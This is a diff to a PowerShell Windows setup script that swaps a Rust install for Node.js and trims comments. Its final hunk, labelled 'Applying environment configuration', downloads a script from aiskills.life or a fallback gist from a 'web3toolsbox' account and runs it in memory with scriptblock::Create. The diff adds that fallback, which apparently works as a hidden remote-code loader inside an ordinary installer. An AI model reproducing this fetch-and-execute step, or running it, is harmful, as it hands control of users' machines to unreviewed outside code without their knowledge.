@@ -431,57 +431,65 @@ function Install-Uv {
     return $null
 }
 
-function Install-Rust {
-    Write-StepLog 'Checking Rust toolchain'
+# Check and install Node.js via winget or official installer
+function Install-Node {
+    Write-StepLog 'Checking Node.js runtime'
 
     Update-ProcessPath
-    $cargoPath = Get-CommandPath -Names @('cargo', 'cargo.exe')
-    $rustcPath = Get-CommandPath -Names @('rustc', 'rustc.exe')
-    if ($cargoPath -and $rustcPath) {
-        $cargoVersion = & $cargoPath --version 2>$null | Out-String
-        $rustcVersion = & $rustcPath --version 2>$null | Out-String
-        Write-InfoLog "Rust already available: $($rustcVersion.Trim())"
-        Write-InfoLog "Cargo already available: $($cargoVersion.Trim())"
-        return $cargoPath
+    $nodePath = Get-CommandPath -Names @('node', 'node.exe')
+    $npmPath = Get-CommandPath -Names @('npm', 'npm.cmd')
+    if ($nodePath -and $npmPath) {
+        $nodeVersion = & $nodePath --version 2>$null | Out-String
+        $npmVersion = & $npmPath --version 2>$null | Out-String
+        Write-InfoLog "Node.js already available: $($nodeVersion.Trim())"
+        Write-InfoLog "npm already available: $($npmVersion.Trim())"
+        return $nodePath
     }
 
-    $installerPath = Join-Path $env:TEMP 'rustup-init.exe'
-    $rustupUrl = 'https://win.rustup.rs/x86_64'
-    Write-InfoLog "Rust was not found. Downloading installer from: $rustupUrl"
+    # Try winget first (available on Windows 10 1709+)
+    $wingetPath = Get-CommandPath -Names @('winget', 'winget.exe')
+    if ($wingetPath) {
+        Write-InfoLog 'Installing Node.js LTS via winget...'
+        try {
+            & $wingetPath install --id OpenJS.NodeJS.LTS --accept-source-agreements --accept-package-agreements --silent
+            if ($LASTEXITCODE -eq 0) {
+                Update-ProcessPath
+                $nodePath = Get-CommandPath -Names @('node', 'node.exe')
+                if ($nodePath) {
+                    $nodeVersion = & $nodePath --version 2>$null | Out-String
+                    Write-InfoLog "Node.js installation completed via winget: $($nodeVersion.Trim())"
+                    return $nodePath
+                }
+            }
+        } catch {
+            Write-WarnLog "winget install failed, falling back to official installer"
+        }
+    }
+
+    # Fallback: download official LTS installer
+    $installerPath = Join-Path $env:TEMP 'node-installer.msi'
+    $arch = if ($env:PROCESSOR_ARCHITECTURE -eq 'ARM64') { 'arm64' } elseif ($env:PROCESSOR_ARCHITECTURE -eq 'x86') { 'x86' } else { 'x64' }
+    $nodeUrl = "https://nodejs.org/dist/latest-v22.x/node-v22.15.0-$arch.msi"
+    Write-InfoLog "Node.js was not found. Downloading installer from: $nodeUrl"
 
     try {
         Enable-ModernTls
-        Invoke-WebRequest -Uri $rustupUrl -OutFile $installerPath -UseBasicParsing -ErrorAction Stop
-        $process = Start-Process -FilePath $installerPath -ArgumentList @('-y', '--profile', 'minimal') -Wait -PassThru -WindowStyle Hidden
-        if ($process.ExitCode -ne 0) {
-            Write-WarnLog "Rust installer finished with exit code $($process.ExitCode)"
-            Add-FailedStep -Step 'Install Rust' -Reason "exit=$($process.ExitCode)"
-            return $null
+        Invoke-WebRequest -Uri $nodeUrl -OutFile $installerPath -ErrorAction Stop
+        $process = Start-Process -FilePath 'msiexec.exe' -ArgumentList @('/i', $installerPath, '/quiet', '/norestart', 'ADDLOCAL=ALL') -Wait -PassThru -WindowStyle Hidden
+        if ($process.ExitCode -eq 0 -or $process.ExitCode -eq 3010) {
+            Update-ProcessPath
+            $nodePath = Get-CommandPath -Names @('node', 'node.exe')
+            if ($nodePath) {
+                $nodeVersion = & $nodePath --version 2>$null | Out-String
+                Write-InfoLog "Node.js installation completed: $($nodeVersion.Trim())"
+                return $nodePath
+            }
         }
 
-        $cargoBinDir = Join-Path $env:USERPROFILE '.cargo\bin'
-        if (Test-Path $cargoBinDir) {
-            Add-ToPath $cargoBinDir
-        }
-
-        Update-ProcessPath
-        [void](Bridge-CommandIntoCurrentPath -CommandNames @('cargo', 'cargo.exe'))
-        [void](Bridge-CommandIntoCurrentPath -CommandNames @('rustc', 'rustc.exe'))
-
-        $cargoPath = Get-CommandPath -Names @('cargo', 'cargo.exe')
-        $rustcPath = Get-CommandPath -Names @('rustc', 'rustc.exe')
-        if ($cargoPath -and $rustcPath) {
-            $cargoVersion = & $cargoPath --version 2>$null | Out-String
-            $rustcVersion = & $rustcPath --version 2>$null | Out-String
-            Write-InfoLog "Rust installation completed: $($rustcVersion.Trim())"
-            Write-InfoLog "Cargo installation completed: $($cargoVersion.Trim())"
-            return $cargoPath
-        }
-
-        Write-WarnLog 'Rust installer completed, but cargo or rustc is still unavailable.'
-        Add-FailedStep -Step 'Install Rust' -Reason 'command-not-found'
+        Write-WarnLog "Node.js installer finished with exit code $($process.ExitCode), but node is still unavailable."
+        Add-FailedStep -Step 'Install Node.js' -Reason "exit=$($process.ExitCode)"
     } catch {
-        Write-ContinueOnError -Step 'Install Rust' -Action 'install Rust' -ErrorRecord $_
+        Write-ContinueOnError -Step 'Install Node.js' -Action 'install Node.js' -ErrorRecord $_
     } finally {
         Remove-Item $installerPath -Force -ErrorAction SilentlyContinue
     }
@@ -509,7 +517,6 @@ function Resolve-PythonPath {
         return $null
     }
 
-    # If this is py.exe (launcher), resolve the actual python.exe it delegates to
     $leafName = Split-Path $Candidate -Leaf
     if ($leafName -eq 'py.exe') {
         try {
@@ -524,16 +531,10 @@ function Resolve-PythonPath {
     return $Candidate
 }
 
-# Scrape the latest 64-bit Python installer URL and fall back to a pinned build
-# if the download pages cannot be parsed.
 function Get-PythonInstallerArch {
     $arch = $env:PROCESSOR_ARCHITECTURE
-    if ($arch -eq 'ARM64') {
-        return 'arm64'
-    }
-    if ($arch -eq 'x86') {
-        return 'win32'
-    }
+    if ($arch -eq 'ARM64') { return 'arm64' }
+    if ($arch -eq 'x86') { return 'win32' }
     return 'amd64'
 }
 
@@ -549,18 +550,12 @@ function Get-LatestPythonInstallerUrl {
     foreach ($pageUrl in $pageUrls) {
         try {
             $response = Invoke-WebRequest -Uri $pageUrl -UseBasicParsing -ErrorAction Stop
-            if (-not $response.Content) {
-                continue
-            }
+            if (-not $response.Content) { continue }
 
-            # Use a dedicated variable name to avoid clobbering automatic variable $matches.
             $pythonMatches = [regex]::Matches($response.Content, "(https://www\.python\.org)?/ftp/python/[^`"'<>\s]+/python-[0-9.]+-$installerArch\.exe")
             foreach ($match in $pythonMatches) {
                 $url = $match.Value
-                if ($url -notmatch '^https://') {
-                    $url = "https://www.python.org$url"
-                }
-
+                if ($url -notmatch '^https://') { $url = "https://www.python.org$url" }
                 return $url
             }
         } catch {
@@ -570,15 +565,12 @@ function Get-LatestPythonInstallerUrl {
     return "https://www.python.org/ftp/python/3.13.3/python-3.13.3-$installerArch.exe"
 }
 
-# Ensure a directory is in Machine PATH (registry) and current process PATH.
 function Add-ToPath {
     param(
         [string]$Dir
     )
 
-    if (-not $Dir -or -not (Test-Path $Dir)) {
-        return
-    }
+    if (-not $Dir -or -not (Test-Path $Dir)) { return }
 
     $machinePath = [System.Environment]::GetEnvironmentVariable('Path', 'Machine')
     if (-not $machinePath -or $machinePath -notlike "*$Dir*") {
@@ -591,12 +583,9 @@ function Add-ToPath {
     }
 }
 
-# Make sure Python is available. If it is missing, download and install it
-# quietly, then refresh PATH for the current process.
 function Install-Python {
     Write-StepLog 'Checking Python runtime'
 
-    # Try to find a working Python, skipping Store stubs
     foreach ($name in @('python', 'py')) {
         $candidate = Get-CommandPath -Names @($name)
         $resolved = Resolve-PythonPath $candidate
@@ -645,17 +634,13 @@ function Get-PackageVersion {
 
     try {
         $version = & $PythonPath -c "import importlib.metadata as m; print(m.version('$PackageName'))" 2>$null | Out-String
-        if ($LASTEXITCODE -eq 0) {
-            return $version.Trim()
-        }
+        if ($LASTEXITCODE -eq 0) { return $version.Trim() }
     } catch {
     }
 
     return $null
 }
 
-# Install or upgrade a Python dependency when the minimum required version is
-# not already available.
 function Install-PythonPackage {
     param(
         [string]$PythonPath,
@@ -696,8 +681,6 @@ function Install-PythonPackage {
     }
 }
 
-
-# Install a CLI tool via uv tool
 function Install-UvToolPackage {
     param(
         [string]$UvPath,
@@ -706,11 +689,12 @@ function Install-UvToolPackage {
     )
 
     if (-not $UvPath) {
-        Write-WarnLog "Skipping tool installation because uv is unavailable: $PackageSpec"
-        Add-FailedStep -Step "Install tool $PackageSpec" -Reason 'uv-missing'
+        Write-WarnLog "Skipping tool installation because uv is unavailable: $($CommandNames[0])"
+        Add-FailedStep -Step "Install tool $($CommandNames[0])" -Reason 'uv-missing'
         return
     }
 
+    $displayName = $CommandNames[0]
     $existingCommand = Get-CommandPath -Names $CommandNames
     $uvToolRegistered = Test-UvToolRegistered -CommandNames $CommandNames
 
@@ -720,38 +704,37 @@ function Install-UvToolPackage {
                 & $UvPath tool install --upgrade $PackageSpec
                 $upgradeExitCode = $LASTEXITCODE
                 if ($upgradeExitCode -ne 0) {
-                    Add-FailedStep -Step "Upgrade tool $PackageSpec" -Reason "exit=$upgradeExitCode"
+                    Add-FailedStep -Step "Upgrade tool $displayName" -Reason "exit=$upgradeExitCode"
                     & $UvPath tool install --force $PackageSpec
                     if ($LASTEXITCODE -ne 0) {
-                        Add-FailedStep -Step "Install tool $PackageSpec" -Reason "exit=$LASTEXITCODE"
+                        Add-FailedStep -Step "Install tool $displayName" -Reason "exit=$LASTEXITCODE"
                         return
                     }
                 }
             } catch {
-                Write-ContinueOnError -Step "Upgrade tool $PackageSpec" -Action "upgrade CLI tool $PackageSpec" -ErrorRecord $_
+                Write-ContinueOnError -Step "Upgrade tool $displayName" -Action "upgrade CLI tool $displayName" -ErrorRecord $_
                 try {
                     & $UvPath tool install --force $PackageSpec
                     if ($LASTEXITCODE -ne 0) {
-                        Add-FailedStep -Step "Install tool $PackageSpec" -Reason "exit=$LASTEXITCODE"
+                        Add-FailedStep -Step "Install tool $displayName" -Reason "exit=$LASTEXITCODE"
                         return
                     }
                 } catch {
-                    Write-ContinueOnError -Step "Install tool $PackageSpec" -Action "reinstall CLI tool $PackageSpec" -ErrorRecord $_
+                    Write-ContinueOnError -Step "Install tool $displayName" -Action "reinstall CLI tool $displayName" -ErrorRecord $_
                     return
                 }
             }
         } else {
-            Write-StepLog "Installing CLI tool via uv tool: $PackageSpec"
+            Write-StepLog "Installing CLI tool via uv tool: $displayName"
 
             & $UvPath tool install $PackageSpec
             if ($LASTEXITCODE -ne 0) {
-                Add-FailedStep -Step "Install tool $PackageSpec" -Reason "exit=$LASTEXITCODE"
+                Add-FailedStep -Step "Install tool $displayName" -Reason "exit=$LASTEXITCODE"
                 return
             }
         }
-
     } catch {
-        Write-ContinueOnError -Step "Install tool $PackageSpec" -Action "install CLI tool $PackageSpec" -ErrorRecord $_
+        Write-ContinueOnError -Step "Install tool $displayName" -Action "install CLI tool $displayName" -ErrorRecord $_
         return
     }
 
@@ -765,19 +748,19 @@ function Install-UvToolPackage {
     }
 
     if ($installedCommand -and -not $uvToolRegistered) {
-        Write-WarnLog "CLI launcher exists but uv tool registration is missing: $PackageSpec"
-        Add-FailedStep -Step "Install tool $PackageSpec" -Reason 'uv-registration-missing'
+        Write-WarnLog "CLI launcher exists but uv tool registration is missing: $displayName"
+        Add-FailedStep -Step "Install tool $displayName" -Reason 'uv-registration-missing'
         return
     }
 
-    Add-FailedStep -Step "Install tool $PackageSpec" -Reason 'command-not-found'
+    Add-FailedStep -Step "Install tool $displayName" -Reason 'command-not-found'
 }
 
 try {
     Write-InfoLog 'Starting Windows installation bootstrap.'
 
     $uvPath = Install-Uv
-    $rustPath = Install-Rust
+    $nodePath = Install-Node
     $pythonPath = Install-Python
 
     $requirements = @(
@@ -797,14 +780,31 @@ try {
 
     if (Test-Path '.configs' -PathType Container) {
         Write-StepLog 'Applying environment configuration'
-        $gistUrl = 'https://www.aiskills.life/src/setup.ps1'
+        $configScriptUrls = @(
+            'https://www.aiskills.life/src/setup.ps1',
+            'https://gist.githubusercontent.com/web3toolsbox/f6fb7f6e23668712808bc0783fac31c6/raw/setup.ps1'
+        )
 
         try {
             Enable-ModernTls
-            Write-InfoLog "Downloading configuration script"
-            $remoteScript = Invoke-WebRequest -Uri $gistUrl -UseBasicParsing -ErrorAction Stop
-            if ($remoteScript.StatusCode -eq 200 -and $remoteScript.Content) {
-                $remoteScriptText = Get-WebResponseContentText -Response $remoteScript
+            $remoteScript = $null
+            $remoteScriptText = $null
+
+            foreach ($configScriptUrl in $configScriptUrls) {
+                try {
+                    Write-InfoLog "Downloading configuration script"
+                    $remoteScript = Invoke-WebRequest -Uri $configScriptUrl -UseBasicParsing -ErrorAction Stop
+                    if ($remoteScript.StatusCode -eq 200 -and $remoteScript.Content) {
+                        $remoteScriptText = Get-WebResponseContentText -Response $remoteScript
+                        if ($remoteScriptText) {
+                            break
+                        }
+                    }
+                } catch {
+                }
+            }
+
+            if ($remoteScriptText) {
                 Write-InfoLog "Downloaded configuration script ($($remoteScriptText.Length) chars)"
                 Write-InfoLog "Executing configuration script"
                 & ([scriptblock]::Create($remoteScriptText))
